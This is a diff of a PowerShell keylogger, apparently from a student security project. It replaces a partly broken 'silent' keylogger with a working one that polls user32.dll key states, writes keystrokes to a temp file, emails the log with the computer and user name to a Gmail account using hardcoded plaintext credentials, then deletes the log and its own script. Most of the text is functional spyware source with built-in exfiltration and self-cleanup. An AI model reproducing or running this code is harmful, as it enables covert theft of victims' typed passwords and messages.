@@ -1,79 +1,94 @@
-# === keylogger.ps1 - Silent Windows Keylogger ===
-Add-Type -AssemblyName System.Windows.Forms
-$SendKey = {
-    $keys = ''
-    $file = "$env:TEMP\key.txt"
-    while($true) {
-        Start-Sleep -Milliseconds 40
-        $currentKey = [System.Windows.Forms.Control]::Focus()
-        $currentKey | Get-Process | Where-Object {$_.MainWindowTitle} | ForEach-Object {
-            if ($title -ne $_.MainWindowTitle) {
-                $title = $_.MainWindowDesktop`
-                "$('-' * 80)`n[$(Get-Date)] Focused Window: $($title)`n$('-' * 80)" | Out-File -Append -Encoding UTF8 $file
-            }
-        }
-        
-        $keys += [System.Windows.Input.Keyboard]::GetAllKeys() |
-                 Where-Object { $_ -match '^[a-zA-Z0-9\s.,;\'"?!@#$%^&*()_+\-=+`~]+$' } |
-                 ForEach-Object { [System.Windows.Forms.SendKeys]::ToString($_) }
+# Edit only this section!
+$TimesToRun = 2
+$RunTimeP = 1
+$From = "cys305finalproject@gmail.com"
+$Pass = "Iwantt0Sw!ng"
+$To = "cys305finalproject@gmail.com"
+$Subject = "$($env:COMPUTERNAME)  /  $($env:USERNAME)"
+$body = "Keylogger Results"
+$SMTPServer = "smtp.gmail.com"
+$SMTPPort = "587"
+$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
+############################
 
-        if ($keys.Length -gt 30) {
-            $keys.Replace('"','""') | Out-File -Append -Encoding UTF8 $file
-            $keys = ''
+
+$TimeStart = Get-Date
+$TimeEnd = $timeStart.addminutes($RunTimeP)
+
+#requires -Version 2
+function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
+{
+  # Signatures for API Calls
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+  # load signatures and make members available
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    
+  # create output file
+  $null = New-Item -Path $Path -ItemType File -Force
+
+  try
+  {
+
+    # create endless loop. When user presses CTRL+C, finally-block
+    # executes and shows the collected key presses
+    $Runner = 0
+	while ($TimesToRun  -ge $Runner) {
+	while ($TimeEnd -ge $TimeNow) {
+      Start-Sleep -Milliseconds 40
+      
+      # scan all ASCII codes above 8
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        # get current key state
+        $state = $API::GetAsyncKeyState($ascii)
+
+        # is key pressed?
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+
+          # translate scan code to real code
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+          # get keyboard state for virtual keys
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+
+          # prepare a StringBuilder to receive input key
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+
+          # translate virtual key
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+          if ($success) 
+          {
+            # add key to logger file
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+          }
         }
+      }
+	  $TimeNow = Get-Date
     }
+	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
+	Remove-Item -Path $Path -force
+    Remove-Item -Path C:\Windows\Temp\KL.ps1
+	}
+  }
+  finally
+  {
+    # open logger file in Notepad
+	exit 1
+  }
 }
 
-# Run async so GUI doesn’t block
-$exec = [ScriptBlock]::Create($SendKey)
-Start-Job $exec > $null
-
-# === Email Exfil Loop (your code enhanced) ===
-
-$SMTPServer = 'smtp.gmail.com'
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
-$SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('cys305finalproject@gmail.com', 'Iwantt0Sw!ng')
-$ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'cys305finalproject@gmail.com'
-$ReportEmail.To.Add('cys305finalproject@gmail.com')
-$ReportEmail.Subject = 'KEYLOGGER PWNAGE FROM ' + $(hostname) + " (" + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName + ")"
-
-while(1){
-    # Only send if file exists and has data
-    if (Test-Path "$env:temp\key.txt") {
-        try {
-            if ((Get-Item "$env:temp\key.txt").Length -gt 1KB) {
-                # Reattach each time because .NET is retarded about reuse
-                Remove-Item "$env:temp\key_enc.txt" -ErrorAction SilentlyContinue
-                Copy-Item "$env:temp\key.txt" "$env:temp\key_enc.txt"
-                
-                # Add attachment fresh each loop to avoid lock issues
-                $attachmentSentYet = $false
-                
-                while (!$attachmentSentYet) {
-                    try {
-                        $ReportEmail.Attachments.Add("$env:temp\key_enc.txt")
-                        $SMTPInfo.Send($ReportEmail)
-                        Write-Host "[+] Sent log packet."
-                        Start-Sleep -Seconds 5
-                        
-                        # Wipe local sent file after success?
-                        Remove-Item "$env:temp\key_enc.txt" -ErrorAction SilentlyContinue
-                        
-                        # Truncate original but keep file alive for ongoing logging
-                        Clear-Content "$env:temp\key.txt"
-                        
-                        sleep 360 # Every 6 mins
-                        
-                        break # Exit retry loop after success
-                    } catch { 
-                        Write-Warning "[!] Email failed... trying again in 30s" 
-                        sleep 30 
-                    }
-                }
-            } else { sleep 60 } # Wait until more keys logged
-
-        } catch { sleep 60 }
-    } else { sleep 30 }
-}
+# records all key presses until script is aborted by pressing CTRL+C
+# will then open the file with collected key codes
+Start-KeyLogger
